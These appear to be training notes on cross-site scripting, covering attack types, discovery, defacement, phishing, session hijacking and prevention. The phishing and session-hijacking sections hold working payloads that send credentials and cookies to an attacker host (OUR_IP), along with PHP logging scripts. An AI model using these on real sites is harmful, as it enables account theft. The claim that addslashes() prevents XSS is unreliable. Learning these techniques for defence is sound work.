# Introduction

**XSS (Cross-Site Scripting)** is a common web application vulnerability that allows attackers to inject malicious JavaScript code into webpages viewed by other users. It occurs due to improper sanitization of user input.

### What is XSS?
- Web apps often display data received from the backend server on the user's browser.
- If the app doesn't sanitize user input properly (like in comments or replies), an attacker can inject malicious JavaScript.
- This code executes in the browser of any user who views the page, causing various attacks.

**Note:** XSS only affects the user's browser, not the backend server.

### XSS Risks
- XSS vulnerabilities are **medium-risk** (low impact but high probability).
- They can cause serious damage to users even if they don't directly affect the server.

### Types of XSS Attacks
XSS attacks allow attackers to execute JavaScript in a victim's browser. Here are some common attack examples:
- Stealing session cookies.
- Changing user settings, like passwords.
- Executing actions like Bitcoin mining or showing ads.

Although XSS is limited to browser execution, skilled attackers can escalate the attack to exploit browser vulnerabilities (e.g., Heap overflows) to affect the system.

### Types of XSS

1. **Stored (Persistent) XSS**  
   - Input is stored on the backend (e.g., in a database).
   - Triggered when the data is retrieved and displayed (e.g., in posts or comments).

2. **Reflected (Non-Persistent) XSS**  
   - Input is processed by the server and displayed on the page immediately without being stored.
   - Common in search results or error messages.

3. **DOM-based XSS**  
   - Input is processed on the client side (browser).
   - No server involvement (e.g., via client-side HTTP parameters or anchor tags).

### Conclusion
- XSS vulnerabilities are common and can cause various attacks in a user's browser.
- Always validate and sanitize user input to prevent XSS attacks.

---

# Stored XSS (Persistent XSS)

## What is Stored XSS?
- **Stored XSS** happens when malicious JavaScript is saved in the website's **backend database**.
- The malicious code runs when the page is loaded by **any user** who visits the page.

## Why is it Dangerous?
- **Affects all users**: Every person visiting the page is vulnerable.
- **Hard to remove**: The malicious code is stored in the database, so it needs to be manually deleted.

## How to Test for Stored XSS?
1. Add input to a page (like a To-Do List).
2. **Inject a test payload**: 
   ```html
   <script>alert(window.origin)</script>
 
   - This will show an alert with the page URL.

## Example:
- If the page doesn’t sanitize input, your payload will appear in the page source:
   ```html
   <ul><script>alert(window.origin)</script></ul>
   ```

## Checking Persistence:
- **Refresh the page**: If the alert appears again, the XSS is stored in the backend (Persistent XSS).

## Other Test Payloads:
- **`<plaintext>`**: Renders HTML as plain text.
- **`<script>print()</script>`**: Triggers the print dialog.

## Iframes and XSS:
- **Cross-domain iframes** can isolate XSS attacks to just the iframe.
- To see which form is vulnerable, use the **`window.origin`** payload to show the current page's URL.


### Key Points:
- **Stored XSS**: Persistent, affects multiple users.
- Test by injecting payloads and refreshing.
- **Sanitize inputs** to prevent XSS.

---

# Reflected Cross-Site Scripting (XSS)

- **Types of Non-Persistent XSS**: Reflected XSS involves the server processing the input and reflecting it back in the response. DOM-based XSS is entirely client-side and does not interact with the back-end server. Both types are non-persistent, meaning they are temporary and do not persist across page refreshes.
  
- **Characteristics of Reflected XSS**:
  - The input is returned by the back-end server without proper filtering or sanitization.
  - Commonly found in error or confirmation messages.
  - Executes only when the user interacts with the crafted URL containing the malicious payload.

- **Example Scenario**:
  - Input (e.g., `test`) is reflected in the server's error message: *Task 'test' could not be added*.
  - If input includes a script tag payload, e.g., `<script>alert(window.origin)</script>`, and the input is not sanitized, it could lead to XSS execution.

- **How to Exploit**:
  - Reflected XSS often involves GET requests, where input parameters are embedded in the URL.
  - By sharing the crafted malicious URL with a target, the XSS payload can execute upon visiting the link.

- **Notes**:
  - Such attacks are limited to the session in which the malicious URL is executed.
  - The vulnerability does not persist; once the user moves away from the page or refreshes, the payload no longer executes.

---

# DOM-based Cross-Site Scripting (XSS)

#### Overview
- **Definition**: A Non-Persistent XSS type processed entirely on the client side using JavaScript through the Document Object Model (DOM).
- **Characteristics**:
  - Input never reaches the back-end server; processed directly in the browser.
  - Input may use a URL fragment (#) to modify the DOM, making it client-side only.
  - Base page source does not display injected inputs; they only appear in the rendered DOM.

#### Source & Sink
- **Source**: The JavaScript object taking user input, e.g., a URL parameter or input field.
- **Sink**: The function writing the input to a DOM object. Vulnerabilities occur if the Sink does not sanitize the input.
- **Common Vulnerable Functions**:
  - `document.write()`
  - `DOM.innerHTML` and `DOM.outerHTML`
  - jQuery functions: `add()`, `after()`, `append()`
- **Example Code**:
  - Input fetched from the `task` parameter:
    ```javascript
    var pos = document.URL.indexOf("task=");
    var task = document.URL.substring(pos + 5, document.URL.length);
    ```
  - Output written to the DOM without sanitization:
    ```javascript
    document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
    ```

#### DOM Attacks
- **Challenges**:
  - Functions like `innerHTML` prevent `<script>` tags from executing.
- **Payload Example** (Avoiding `<script>` tags):
  ```html
  <img src="" onerror=alert(window.origin)>
  ```
  - This creates an image with an `onerror` attribute to execute JavaScript code.


#### Exploitation
- **Steps**:
  - Use the vulnerable URL containing the payload.
  - Share the crafted URL with the target; the JavaScript executes upon visiting it.
  - Example URL:
    ```
    http://SERVER_IP:PORT/#task=<img src="" onerror=alert(window.origin)>
    ```

--- 

# XSS Discovery

#### Overview
- XSS vulnerabilities allow JavaScript injection into client-side pages, resulting in code execution.
- Detecting XSS vulnerabilities can be as challenging as exploiting them due to varying application security levels.

#### Automated Discovery
- **Tools**:
  - Paid Tools: Nessus, Burp Pro, ZAP (high accuracy, detect all XSS types).
  - Open-Source Tools: XSStrike, Brute XSS, XSSer.
- **Scanning Types**:
  - **Passive Scan**: Analyzes client-side code for DOM-based vulnerabilities.
  - **Active Scan**: Injects payloads to test for XSS in the page source.
- **Example**: XSStrike
  - Clone and run XSStrike to test payload injection for Reflected XSS.
  - Outputs details like vulnerable parameters and generated payloads.

#### Manual Discovery
- **XSS Payloads**:
  - Test input fields with basic `<script>` tags or other vectors (e.g., `<img>`, CSS attributes).
  - Payload lists: *PayloadAllTheThings* and *PayloadBox*.
  - XSS injection points can also be in HTTP headers (e.g., Cookie, User-Agent).
- **Efficiency**:
  - Writing Python scripts for automated testing and payload analysis can save time for large applications.

#### Code Review
- **Methodology**:
  - Review both back-end and front-end code.
  - Understand the flow of input data to identify vulnerabilities.
  - Custom payloads can be crafted for specific web applications.
- **Use Case**:
  - Analyze the "Source and Sink" for DOM-based XSS vulnerabilities.

---

# Defacing 

#### Overview
- **Definition**: Defacing changes the appearance of a website using malicious code, often for claiming a successful hack.
- **Impact**: Such attacks can harm a company's reputation, investments, and share prices (e.g., NHS defacement in 2018).
- **Stored XSS**: Commonly used for website defacing as payloads persist across user sessions.

#### Key Elements for Defacement
1. **Background Color** (`document.body.style.background` or `document.body.background`):
   - Example payload for dark background:
     ```html
     <script>document.body.style.background = "#141d2b"</script>
   ```
   - Example payload for background image:
     ```html
     <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
   ```
2. **Page Title** (`document.title`):
   - Change title to display a custom message:
     ```html
     <script>document.title = 'HackTheBox Academy'</script>
   ```
3. **Page Text** (`DOM.innerHTML` or jQuery):
   - Change specific text:
     ```javascript
     document.getElementById("todo").innerHTML = "New Text";
     ```
   - Change entire page body content:
     ```javascript
     document.getElementsByTagName('body')[0].innerHTML = "New Content";
     ```

#### Example Full Defacement
- Custom HTML code for defacement:
  ```html
  <center>
      <h1 style="color: white">Cyber Security Training</h1>
      <p style="color: white">by 
          <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
      </p>
  </center>
  ```
- Minified and added to the payload:
  ```html
  <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"></p></center>'</script>
  ```

#### Execution
- Injected payloads will:
  - Change background color or image.
  - Update the page title.
  - Replace the entire page content with custom text or HTML.

- Code execution happens when the malicious JavaScript runs in the browser, changing the page appearance for visitors.

---

# Phishing via XSS

#### Overview
- **Definition**: Phishing attacks use fake elements, like login forms, to collect sensitive information (e.g., credentials).
- **Impact**: Exploited XSS vulnerabilities allow attackers to create phishing simulations or target real users.

#### XSS Discovery
- Identify a vulnerable input field.
- Test XSS payloads to find one that executes JavaScript.
- View how input is rendered in the page source to understand the necessary payload structure.

#### Login Form Injection
1. **HTML Code for Login Form**:
   ```html
   <h3>Please login to continue</h3>
   <form action=http://OUR_IP>
       <input type="username" name="username" placeholder="Username">
       <input type="password" name="password" placeholder="Password">
       <input type="submit" name="submit" value="Login">
   </form>
   ```
   - Replace `OUR_IP` with the attacker's IP.
   - The form collects credentials and sends them to the attacker's server.

2. **JavaScript Payload**:
   - Inject the form using `document.write()`:
     ```javascript
     document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
     ```
     
#### Cleaning Up
- **Remove Elements**: Hide original elements to improve realism:
  ```javascript
  document.getElementById('urlform').remove();
  ```
- **Comment Unwanted Code**: Remove leftover HTML with:
  ```html
  ...PAYLOAD... <!--
  ```

#### Credential Stealing
1. **Using Netcat**:
   - Start a listener to capture credentials:
     ```bash
     sudo nc -lvnp 80
     ```
   - Captures data as HTTP requests (e.g., `/username=test&password=test`).

2. **Using a PHP Script**:
   - Write credentials to a file and redirect the user:
     ```php
     <?php
     if (isset($_GET['username']) && isset($_GET['password'])) {
         $file = fopen("creds.txt", "a+");
         fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
         header("Location: http://SERVER_IP/phishing/index.php");
         fclose($file);
         exit();
     }
     ?>
     ```
   - Start the PHP server:
     ```bash
     mkdir /tmp/tmpserver
     cd /tmp/tmpserver
     vi index.php #at this step we wrote our index.php file
     sudo php -S 0.0.0.0:80
     
     ```

#### Exploitation
- Share a malicious URL with the crafted XSS payload.
- Once victims enter credentials, they are logged and stored on the attacker's server.

---

# Session Hijacking 

#### Overview
- **Definition**: Session hijacking exploits cookies to take over a user's active session without requiring credentials.
- **Blind XSS**: Occurs when the XSS payload is executed on a page (e.g., Admin Panel) that attackers can't directly access.



#### Blind XSS Detection
1. **Examples of Vulnerable Forms**:
   - Contact Forms
   - Reviews
   - Support Tickets
   - HTTP User-Agent header
2. **Steps**:
   - Use XSS payloads that load a remote JavaScript file:
     ```html
     <script src="http://OUR_IP/field_name"></script>
     ```
   - Monitor incoming requests to your server using a listener (e.g., PHP or Netcat).
   - Identify the vulnerable input field by observing the requests.



#### Exploitation: Loading a Remote Script
1. **JavaScript Cookie Stealing Payload**:
   ```javascript
   new Image().src='http://OUR_IP/index.php?c='+document.cookie;
   ```
   - Payload sends the cookie data to the attacker's server.
2. **XSS Payload**:
   ```html
   <script src="http://OUR_IP/script.js"></script>
   ```
   - Script hosted on the attacker's server.



#### Preparing the Listener
1. **Set up a PHP Listener**:
   - Save the following PHP code as `index.php`:
     ```php
     <?php
     if (isset($_GET['c'])) {
         $list = explode(";", $_GET['c']);
         foreach ($list as $key => $value) {
             $cookie = urldecode($value);
             $file = fopen("cookies.txt", "a+");
             fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
             fclose($file);
         }
     }
     ?>
     ```
   - Start the PHP server:
     ```bash
     sudo php -S 0.0.0.0:80
     ```



#### Execution
1. **Payload Submission**:
   - Inject the JavaScript payload into the vulnerable input field.
   - Wait for the victim to trigger the payload.
2. **Cookie Capture**:
   - View captured cookies in `cookies.txt`:
     ```bash
     cat cookies.txt
     ```
3. **Using Stolen Cookies**:
   - Navigate to the target site.
   - Open Developer Tools (Shift + F9 in Firefox) → Storage.
   - Add the stolen cookie (Name = part before `=`, Value = part after `=`).
   - Refresh the page to gain victim access.

---

# XSS Prevention Notes

## Key Concepts:
- **XSS (Cross-Site Scripting)**: A type of vulnerability where malicious scripts are injected into trusted websites or web applications. These scripts can execute in a user's browser, leading to potential data theft, session hijacking, and other malicious actions.
- **Source**: A part of the web application where user input is collected, such as a form field or URL query parameter.
- **Sink**: A part of the web application where the user input is reflected or displayed, such as an HTML page or script execution context. This is where malicious input can be executed.

## Preventing XSS on the Front-End:

### 1. **Input Validation**:
   - **What is it?**: Ensuring that the data entered by the user matches the expected format before it is processed by the application. For example, an email field should only accept a valid email address format.
   - **Why is it important?**: Helps ensure that only properly formatted data is accepted and prevents malformed input from reaching further stages of the application.
   - **Example (Email Validation)**:
     ```javascript
     function validateEmail(email) {
         const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
         return re.test($("#login input[name=email]").val());
     }
     ```
     This code checks if the email entered follows a valid format using regex.

### 2. **Input Sanitization**:
   - **What is it?**: Input sanitization ensures that any special characters in the user input are escaped or removed to prevent them from being interpreted as code.
   - **Why is it important?**: Without sanitization, user input can contain malicious scripts, leading to vulnerabilities like DOM-based XSS.
   - **Example (DOMPurify)**:
     ```javascript
     <script type="text/javascript" src="dist/purify.min.js"></script>
     let clean = DOMPurify.sanitize(dirty);
     ```
     The `DOMPurify` library sanitizes input, removing any dangerous HTML, JavaScript, or other harmful content that could lead to XSS attacks.

### 3. **Avoid Direct Input in Sensitive HTML Tags**:
   - **What is it?**: Avoid inserting raw user input into sensitive HTML elements, such as `<script>`, `<style>`, or `div` attributes, as these could execute harmful code.
   - **Why is it important?**: If user input is directly inserted into sensitive elements, malicious scripts might be executed, leading to security vulnerabilities.
   - **Examples of Dangerous HTML Tags**:
     - `<script></script>`: Directly injecting user input into a `<script>` tag can allow malicious code execution.
     - `<style></style>`: User input here can affect the page's CSS and potentially manipulate how scripts execute.
     - `<div name='INPUT'></div>`: User input inside an attribute like `name` can be interpreted as code.
   - **Unsafe Functions**:
     - `DOM.innerHTML`: Replaces the HTML content of an element, allowing malicious input to be executed as code.
     - `document.write()`: Writes content directly to the HTML page, which can allow the insertion of harmful scripts.
     - jQuery functions like `html()`, `append()`, etc., directly insert user input into the DOM.

## Preventing XSS on the Back-End:

### 1. **Input Validation**:
   - **What is it?**: Just like front-end validation, back-end validation ensures that data coming from users is as expected. This is done using pattern matching (regex) or validation libraries.
   - **Why is it important?**: Back-end validation is critical because attackers can bypass front-end validation and send malicious input directly to the server.
   - **Example (Email Validation in PHP)**:
     ```php
     if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
         // Input is valid
     } else {
         // Reject invalid input
     }
     ```
     This PHP code checks if the email provided in the query string is valid.

### 2. **Input Sanitization**:
   - **What is it?**: Sanitizing user input on the back-end means escaping special characters (like `<`, `>`, or `&`) that could otherwise be interpreted as HTML or JavaScript code.
   - **Why is it important?**: Input sanitization helps prevent stored or reflected XSS by ensuring that user-provided data doesn't contain executable code.
   - **Example (PHP Sanitization)**:
     ```php
     addslashes($_GET['email']);
     ```
     This function escapes special characters in a string by adding backslashes, which helps prevent malicious characters from being interpreted.

   - **Example (NodeJS with DOMPurify)**:
     ```javascript
     import DOMPurify from 'dompurify';
     var clean = DOMPurify.sanitize(dirty);
     ```
     Using **DOMPurify** on the back-end in NodeJS ensures that any malicious content in user input is sanitized before being used.

### 3. **Output Encoding**:
   - **What is it?**: Output encoding is the process of converting special characters into their HTML entity equivalents (e.g., `<` becomes `&lt;`) before displaying them to the user.
   - **Why is it important?**: It ensures that user input is treated as data, not code. For example, displaying a `<script>` tag as `&lt;script&gt;` will render it as plain text, not executable code.
   - **Example (PHP)**:
     ```php
     htmlentities($_GET['email']);
     ```
     The `htmlentities()` function converts special characters into HTML entities, preventing them from being interpreted as code.

   - **Example (NodeJS with html-entities)**:
     ```javascript
     import encode from 'html-entities';
     encode('<'); // -> '&lt;';
     ```
     This ensures that any potentially harmful characters are displayed safely.

## Server Configuration:

### 1. **Secure Web Server Settings**:
   - **What is it?**: Proper server settings help reduce the risk of XSS by enforcing secure practices.
   - **Why is it important?**: Even with front-end and back-end protection, misconfigured server settings can still leave your application vulnerable.
   - **Best Practices**:
     - Use HTTPS to encrypt traffic and protect against man-in-the-middle attacks.
     - Set **X-Content-Type-Options: nosniff** to prevent browsers from interpreting files as a different MIME type.
     - Use **Content-Security-Policy** (CSP) to restrict which scripts and resources are allowed to execute.

### 2. **Web Application Firewall (WAF)**:
   - **What is it?**: A WAF is a security system that sits between users and the web server to filter and monitor HTTP requests, blocking malicious traffic.
   - **Why is it important?**: WAFs can help automatically detect and block common attacks, including XSS, before they reach your application.

### 3. **Built-in Framework Protection**:
   - **What is it?**: Many modern web frameworks (e.g., ASP.NET, Django, Rails) include built-in mechanisms to prevent XSS attacks by automatically sanitizing user inputs and encoding output.
   - **Why is it important?**: Frameworks with built-in protections reduce the likelihood of XSS vulnerabilities, especially when developers forget to implement safeguards.

## Final Recommendations:
- **Practice both offensive and defensive security techniques** to gain a comprehensive understanding of XSS and improve your ability to secure applications.
- **Keep learning and testing**: Regularly test your applications for XSS vulnerabilities using automated tools and manual techniques to identify new attack vectors.
